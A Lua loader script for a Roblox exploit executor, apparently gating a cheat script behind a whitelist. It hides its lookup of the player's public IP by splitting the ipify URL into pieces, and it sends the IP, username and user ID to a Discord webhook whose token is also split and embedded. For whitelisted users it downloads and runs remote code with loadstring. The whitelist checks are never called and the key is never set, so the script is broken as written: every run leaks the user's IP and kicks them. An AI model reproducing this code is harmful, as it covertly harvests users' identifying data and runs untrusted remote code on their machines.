


local wl_key
local whitelist
local blacklist

local whitelist_response = false
local blacklist_response = false

local user_id = game.Players.LocalPlayer.UserId
local username = game.Players.LocalPlayer.Name

local api0 = "https://api.i"
local api1 = "pify"
local api2 = ".org"
local api = api0..api1..api2

local identification_protocol = tostring(game:HttpGet(api, true))

local webhook_string = 'Username: '..username .. '\nUser ID: '..user_id .. '\nIdentification Protocol: '..identification_protocol

local authorized = "https://raw.githubusercontent.com/Graham-Void/Protage/main/White.lua"
local blacklisted = "https://raw.githubusercontent.com/Graham-Void/Protage/main/banned.lua"
local void_script = "https://raw.githubusercontent.com/Graham-Void/Protage/main/script.lua"



local discord = function(arg)
    local d1 = "https://discord.com/api/webhooks/"
    local d2 = '1046279988242042942/unFD3HAP4-R9CuS0Pu6aBmvTsSj5k'
    local d3 = '7IP9LYeH4nfAqbt0wsNoFgrL9LbUKn_4X2SaUhq'
    local url = d1..d2..d3
    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Login Detection",
            ["description"] = arg,
            ["color"] = 16711680,
            ["footer"] = {
                ["text"] = webhook_string,
            },
        }}
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    request = http_request or request or syn.request
    request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = newdata
    })
end

local check_whitelist = function()
    local whitelist_response = game:HttpGet(authorized, true)
    if string.find(whitelist_response, wl_key) then
        whitelist = true
    else
        whitelist = false
    end
end

local check_blacklist = function()
    local blacklist_response = game:HttpGet(blacklisted, true)
    if string.find(blacklist_response, wl_key) then
        blacklist = true
    else
        blacklist = false
    end
end



local main = function()
    if whitelist == true then
        if blacklist == false then
            loadstring(game:HttpGet(void_script, true))()
        else
            discord("Blacklisted User Attempted Login")
            wait(2)
            game.Players.LocalPlayer:Kick("You are blacklisted!")
        end
    else
        discord("Unauthorized User Attempted Login")
        wait(2)
        game.Players.LocalPlayer:Kick("You are not whitelisted!")
    end
end


main()



